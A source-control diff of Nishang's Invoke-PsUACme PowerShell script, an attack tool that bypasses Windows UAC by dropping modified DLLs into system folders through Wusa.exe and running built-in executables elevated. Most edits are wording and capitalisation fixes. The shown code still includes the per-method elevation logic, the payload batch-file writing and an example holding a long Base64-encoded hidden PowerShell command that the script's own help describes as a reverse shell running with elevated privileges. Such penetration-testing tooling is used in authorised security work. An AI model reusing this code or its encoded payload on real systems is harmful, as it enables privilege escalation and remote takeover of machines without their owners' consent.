@@ -6687,25 +6687,25 @@ function Invoke-PsUACme
 Nishang script which uses known methods to bypass UAC.
 
 .DESCRIPTION
-This script implements methods from UACME project (https://github.com/hfiref0x/UACME) to bypass UAC on Windows machines.
+This script implements methods from the UACME project (https://github.com/hfiref0x/UACME) to bypass UAC on Windows machines.
 It drops DLLs in the known misconfigured/vulnerable locations of Windows machines using Wusa.exe and executes built-in executables 
-to bypass UAC. Following methods (named mostly on the basis of executables used) are implemented: "sysprep","oobe","ActionQueue",
-"migwiz","cliconfg","winsat" and "mmc"
+to bypass UAC. The following methods (named mostly after the executables) are implemented: "sysprep", "oobe", "ActionQueue", 
+"migwiz", "cliconfg", "winsat" and "mmc".
  
-The DLLs dropped by the script is a modified version of Fubuki from the UACME project. It needs separate DLLs for 64 bit and 32 bit machines.
-It is able to determine the bit-ness of the process from which it is called and uses the apt DLL.
+The DLLs dropped by the script are a modified version of Fubuki from the UACME project. The script needs separate DLLs for 64-bit and 32-bit machines.
+It is able to determine the architecture of the process from which it is called and use the appropriate DLL.
 
-The script drops cmd.bat in the C:\Windows\Temp directory and it is this batch file which is called from the DLL. Everything provided
+The script drops cmd.bat in the C:\Windows\Temp directory, and it is this batch file which is called from the DLL. Everything provided
 to the Payload parameter ends up in this batch file.
 
-Wusa.exe on Windows 10  has not "extract" option. Therefore, Invoke-PsUACme does not work on Windows 10 currently.
-A clean up is done by the script after payload execution. But the DLLs dropped in secure locations must be removed manually.
+Wusa.exe on Windows 10 has no "extract" option. Therefore, Invoke-PsUACme currently does not work on Windows 10.
+A clean up is done by the script after payload execution, but the DLLs dropped in secure locations must be removed manually.
 The script must be run from a process running with medium integrity.
 
 .PARAMETER Payload
 Payload to be executed from the elevated process. Default one checks of the elevation was successful.
 
-.PARAMETER method
+.PARAMETER Method
 The method to be used for elevation. Defaut one is sysprep.
 
 .PARAMETER PayloadPath
@@ -6728,16 +6728,16 @@ PS > Invoke-PsUACme -Verbose
 Above command runs the sysprep method and the default payload.
 
 .EXAMPLE
-PS > Invoke-PsUACme -method oobe -Verbose
+PS > Invoke-PsUACme -Method oobe -Verbose
 Above command runs the oobe method and the default payload.
 
 .EXAMPLE
-PS > Invoke-PsUACme -method oobe -Payload "powershell -windowstyle hidden -e SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAgACgAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBEAGUAZgBsAGEAdABlAFMAdAByAGUAYQBtACAAKAAkACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACAAKAAsACQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAVABaAEYAZABhADgASQB3AEYASQBiAHYAQgAvAHMAUABoADkASwBOAGgATgBuAFEAMQBnADgAMgB5ADQAUwB0AGIAQwBJAE0AbABWAFgAWQBoAFgAZwBSADIANABQAHQAcgBGAFgAcwBFAFIAWAAxAHYAeQA5AHAAYgBlAGQAVgBEAHUASAA5AGUARQA1AGkAaABtAG0AQwBHAGMARQByAEQASABGAHYAagBlAGEALwBHAEIASQBFAHgANQB4AHcASgBZAFoASQBJAGwAaQBIAFMANgBSAGMAVABQAHkAeABYAHkAaQBaADQAYgB5ADQAdwB1AGsAOABDADcAZABwAEMAOABkAG8AdABGAHAATgA3AHAAawA1AGIAVgBHAHUAVgBJAHgAWgBCAG8AbwArAFUAbABEAGMATQBlADUATgA1ADAAZgBDADYAVwB4AG0ANgBqAE4AWABJAGwAdQBJAFQAcgB2AGQAYgBKADgAZgBUAHYAYgBGADIAOABkAEoAaQBvAHkAWgBpAGIAYQBYAFEAZQBJAGIAWgBjAFIASwBmAFEAUABzAEIAcABTAGoAKwBNAEoAcwBRAFQASABuAFkARwBVAEkATgBqADkANQBaAGkAUgBKAEsAaAArADcAdwBiAGMAbQB4AHcAMABPADUAUQBxAHIAUgBTAFoANABJAFAARQBXACsASQBQAEIAUgB4AGEAdQBvAHkAUgBiADgAQwB1AGYARwBxAHMAVwBYAFoATABvAFQAVABDAEwANQBqAEoAYwA2AHQAQQBFAEQAMQBBADIAdQBMADEASABCADgANAB3ADIAcABGAFYAMgB1AEIARwA2AGsASgBCAFgAaABtAGYAdwBCAGcASABZAEsAaQBUAGIAZgBZAFIARgAyAE4ASgBzAGIANwBzAGcAWABIADEAcQBFAEkAZABQAHkAVQBOAGgAbABlAG0AVwBiAGQAYgBNAEIAWgBzADcANQBxAEoALwBUAGYAVQBUAHkAeAArAHQAZwBrAGgAcQAzAE0AVQBkAHoAMQBYAHoAMQBOAHIAUAA5AE4AZABIAGoATgArADgAYQBwAGYAOABkAE4AMQBqAG8AegBmADMALwAwAEIAJwApACkAKQApACwAIABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACwAIABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7AA=="
+PS > Invoke-PsUACme -Method oobe -Payload "powershell -windowstyle hidden -e SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAgACgAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBEAGUAZgBsAGEAdABlAFMAdAByAGUAYQBtACAAKAAkACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACAAKAAsACQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAVABaAEYAZABhADgASQB3AEYASQBiAHYAQgAvAHMAUABoADkASwBOAGgATgBuAFEAMQBnADgAMgB5ADQAUwB0AGIAQwBJAE0AbABWAFgAWQBoAFgAZwBSADIANABQAHQAcgBGAFgAcwBFAFIAWAAxAHYAeQA5AHAAYgBlAGQAVgBEAHUASAA5AGUARQA1AGkAaABtAG0AQwBHAGMARQByAEQASABGAHYAagBlAGEALwBHAEIASQBFAHgANQB4AHcASgBZAFoASQBJAGwAaQBIAFMANgBSAGMAVABQAHkAeABYAHkAaQBaADQAYgB5ADQAdwB1AGsAOABDADcAZABwAEMAOABkAG8AdABGAHAATgA3AHAAawA1AGIAVgBHAHUAVgBJAHgAWgBCAG8AbwArAFUAbABEAGMATQBlADUATgA1ADAAZgBDADYAVwB4AG0ANgBqAE4AWABJAGwAdQBJAFQAcgB2AGQAYgBKADgAZgBUAHYAYgBGADIAOABkAEoAaQBvAHkAWgBpAGIAYQBYAFEAZQBJAGIAWgBjAFIASwBmAFEAUABzAEIAcABTAGoAKwBNAEoAcwBRAFQASABuAFkARwBVAEkATgBqADkANQBaAGkAUgBKAEsAaAArADcAdwBiAGMAbQB4AHcAMABPADUAUQBxAHIAUgBTAFoANABJAFAARQBXACsASQBQAEIAUgB4AGEAdQBvAHkAUgBiADgAQwB1AGYARwBxAHMAVwBYAFoATABvAFQAVABDAEwANQBqAEoAYwA2AHQAQQBFAEQAMQBBADIAdQBMADEASABCADgANAB3ADIAcABGAFYAMgB1AEIARwA2AGsASgBCAFgAaABtAGYAdwBCAGcASABZAEsAaQBUAGIAZgBZAFIARgAyAE4ASgBzAGIANwBzAGcAWABIADEAcQBFAEkAZABQAHkAVQBOAGgAbABlAG0AVwBiAGQAYgBNAEIAWgBzADcANQBxAEoALwBUAGYAVQBUAHkAeAArAHQAZwBrAGgAcQAzAE0AVQBkAHoAMQBYAHoAMQBOAHIAUAA5AE4AZABIAGoATgArADgAYQBwAGYAOABkAE4AMQBqAG8AegBmADMALwAwAEIAJwApACkAKQApACwAIABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACwAIABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7AA=="
 Above command runs the oobe method and the specified payload. The payload in this case is the one liner PowerShell reverse shell
-(Shells directory of Nishang) which is base64 encoded using the Invoke-Encode (with the -OutCommand parameter) script from the 
+from the Shells directory of Nishang, which is Base64 encoded using the Invoke-Encode (with the -OutCommand parameter) script from the 
 Utility directory of Nishang.
 
-The reverse shell in above case runs with elevated privileges.
+The reverse shell in the above case runs with elevated privileges.
 
 .LINK
 http://www.labofapenetrationtester.com/2015/09/bypassing-uac-with-powershell.html
@@ -6754,7 +6754,7 @@ https://github.com/samratashok/nishang
         [Parameter(Position = 1, Mandatory = $False)]
         [ValidateSet("sysprep","oobe","ActionQueue","migwiz","cliconfg","winsat","mmc")]
         [String]
-        $method = "sysprep",
+        $Method = "sysprep",
         
         [Parameter(Position = 2, Mandatory = $False)]
         [String]
@@ -6782,36 +6782,36 @@ https://github.com/samratashok/nishang
     
     if ($CustomDll64)
     {
-        Write-Verbose "Reading 64 bit DLL."
+        Write-Verbose "Reading 64-bit DLL."
         [byte[]]$bytes = [System.IO.File]::ReadAllBytes($CustomDll64)
         $DllBytes64 = $bytes -join ' '
     }
     elseif ($CustomDll32)
     {
-        Write-Verbose "Reading 32 bit DLL."
+        Write-Verbose "Reading 32-bit DLL."
         [byte[]]$bytes = [System.IO.File]::ReadAllBytes($CustomDll32)
         $DllBytes32 = $bytes -join ' '
     }
     
     if (([IntPtr]::Size) -eq 8)
     {
-        Write-Verbose "64 bit process detected."
+        Write-Verbose "64-bit process detected."
         $DllBytes = $DllBytes64
     }
     elseif (([IntPtr]::Size) -eq 4)
     {
-        Write-Verbose "32 bit process detected."
+        Write-Verbose "32-bit process detected."
         $DllBytes = $DllBytes32
     }
 
     Out-File -FilePath $PayloadPath -InputObject $Payload -Encoding ascii
     $OSVersion = (Get-WmiObject -Class win32_OperatingSystem).BuildNumber
-    switch($method)
+    switch($Method)
     {
 
         "Sysprep"
         {
-            Write-Output "Using Sysprep method"
+            Write-Output "Using Sysprep method."
             if ($OSVersion -match "76")
             {
                 Write-Verbose "Windows 7 found!"
@@ -6834,7 +6834,7 @@ https://github.com/samratashok/nishang
         
             if ($OSVersion -match "10")
             {
-                Write-Warning "Windows 10 found. Wusa.exe on Windows 10 has no extract option. Not supported *yet*. "
+                Write-Warning "Windows 10 found. Wusa.exe on Windows 10 has no extract option, which is not supported *yet*."
             }
             $Target = "$env:temp\uac.cab"
             $wusapath = "C:\Windows\System32\Sysprep\"
@@ -6850,7 +6850,7 @@ https://github.com/samratashok/nishang
 
         "OOBE"
         {
-            Write-Output "Using OOBE method"
+            Write-Output "Using OOBE method."
             Write-Verbose "Writing DLLs to Temp directory"
             if ($OSVersion -match "76")
             {
@@ -6874,7 +6874,7 @@ https://github.com/samratashok/nishang
         
             if ($OSVersion -match "10")
             {
-                Write-Warning "Windows 10 found. Wusa.exe on Windows 10 has no extract option. Not supported *yet*. "
+                Write-Warning "Windows 10 found. Wusa.exe on Windows 10 has no extract option, which is not supported *yet*."
             }
             $Target = "$env:temp\uac.cab"
             $wusapath = "C:\Windows\System32\oobe\"
@@ -6890,7 +6890,7 @@ https://github.com/samratashok/nishang
 
         "ActionQueue"
         {
-            Write-Output "Using Sysprep Actionqueue method"
+            Write-Output "Using Sysprep Actionqueue method."
             if ($OSVersion -match "76")
             {
                 Write-Verbose "Windows 7 found!"
@@ -6903,12 +6903,12 @@ https://github.com/samratashok/nishang
     
             if ($OSVersion -match "96")
             {
-                Write-Warning "This method doesn't work Windows 8.1 onwards."
+                Write-Warning "This method does not work beyond Windows 8.1."
             }
         
             if ($OSVersion -match "10")
             {
-                Write-Warning "Windows 10 found. Wusa.exe on Windows 10 has no extract option. Not supported *yet*. "
+                Write-Warning "Windows 10 found. Wusa.exe on Windows 10 has no extract option, which is not supported *yet*."
             }
             $Target = "$env:temp\uac.cab"
             $wusapath = "C:\Windows\System32\Sysprep\"
@@ -6924,7 +6924,7 @@ https://github.com/samratashok/nishang
 
         "migwiz"
         {
-            Write-Output "Using migwiz method"
+            Write-Output "Using migwiz method."
             if ($OSVersion -match "76")
             {
                 Write-Verbose "Windows 7 found!"
@@ -6947,7 +6947,7 @@ https://github.com/samratashok/nishang
         
             if ($OSVersion -match "10")
             {
-                Write-Warning "Windows 10 found. Wusa.exe on Windows 10 has no extract option. Not supported *yet*. "
+                Write-Warning "Windows 10 found. Wusa.exe on Windows 10 has no extract option, which is not supported *yet*."
             }
             $Target = "$env:temp\uac.cab"
             $wusapath = "C:\Windows\System32\migwiz\"
@@ -6963,7 +6963,7 @@ https://github.com/samratashok/nishang
 
         "cliconfg"
         {
-            Write-Output "Using cliconfg method"
+            Write-Output "Using cliconfg method."
             if ($OSVersion -match "76")
             {
                 Write-Verbose "Windows 7 found!"
@@ -6986,7 +6986,7 @@ https://github.com/samratashok/nishang
         
             if ($OSVersion -match "10")
             {
-                Write-Warning "Windows 10 found. Wusa.exe on Windows 10 has no extract option. Not supported *yet*. "
+                Write-Warning "Windows 10 found. Wusa.exe on Windows 10 has no extract option, which is not supported *yet*."
             }
             $Target = "$env:temp\uac.cab"
             $wusapath = "C:\Windows\System32\"
@@ -7002,7 +7002,7 @@ https://github.com/samratashok/nishang
 
        "winsat"
         {
-            Write-Output "Using winsat method"
+            Write-Output "Using winsat method."
             if ($OSVersion -match "76")
             {
                 Write-Verbose "Windows 7 found!"
@@ -7025,7 +7025,7 @@ https://github.com/samratashok/nishang
         
             if ($OSVersion -match "10")
             {
-                Write-Warning "Windows 10 found. Wusa.exe on Windows 10 has no extract option. Not supported *yet*. "
+                Write-Warning "Windows 10 found. Wusa.exe on Windows 10 has no extract option, which is not supported *yet*."
             }
             $Target = "$env:temp\uac.cab"
             $wusapath = "C:\Windows\System32\sysprep\"
@@ -7048,7 +7048,7 @@ https://github.com/samratashok/nishang
 
         "mmc"
         {
-            Write-Output "Using mmc method"
+            Write-Output "Using mmc method."
             if ($OSVersion -match "76")
             {
                 Write-Verbose "Windows 7 found!"
@@ -7071,7 +7071,7 @@ https://github.com/samratashok/nishang
         
             if ($OSVersion -match "10")
             {
-                Write-Warning "Windows 10 found. Wusa.exe on Windows 10 has no extract option. Not supported *yet*. "
+                Write-Warning "Windows 10 found. Wusa.exe on Windows 10 has no extract option, which is not supported *yet*."
             }
             $Target = "$env:temp\uac.cab"
             $wusapath = "C:\Windows\System32\"
@@ -7086,7 +7086,7 @@ https://github.com/samratashok/nishang
         }
     }
 
-    #Clean up
+    # Clean up
     Write-Verbose "Removing $Target."
     Remove-Item -Path $Target
     Write-Verbose "Removing $PathToDll."
@@ -7095,4 +7095,3 @@ https://github.com/samratashok/nishang
     Write-Verbose "$PayloadPath must be removed manually."
     
 }
-           
